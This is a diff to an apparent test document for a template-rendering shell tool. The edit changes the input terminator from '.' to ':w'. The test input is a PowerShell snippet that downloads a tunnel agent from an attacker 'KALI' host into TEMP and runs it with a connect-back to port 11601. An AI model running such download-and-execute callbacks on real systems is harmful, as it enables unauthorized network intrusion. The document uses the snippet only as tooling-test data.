@@ -201,7 +201,7 @@ Expected buffer:
 ## Input Render Test
 
 This verifies that `ii p --input` renders lowercase variables, leaves uppercase
-and PowerShell scope variables unchanged, stops at `.`, and copies only the
+and PowerShell scope variables unchanged, stops at `:w`, and copies only the
 rendered body when `--copy` is used.
 
 ```zsh
@@ -216,7 +216,7 @@ tmux send-keys -t codex-ii-input '$KALI = "$lhost"' Enter
 tmux send-keys -t codex-ii-input '$FILE = "${file:t}"' Enter
 tmux send-keys -t codex-ii-input 'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' Enter
 tmux send-keys -t codex-ii-input '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' Enter
-tmux send-keys -t codex-ii-input '.' Enter
+tmux send-keys -t codex-ii-input ':w' Enter
 sleep 2
 tmux capture-pane -t codex-ii-input -p -S -120
 tmux show-buffer
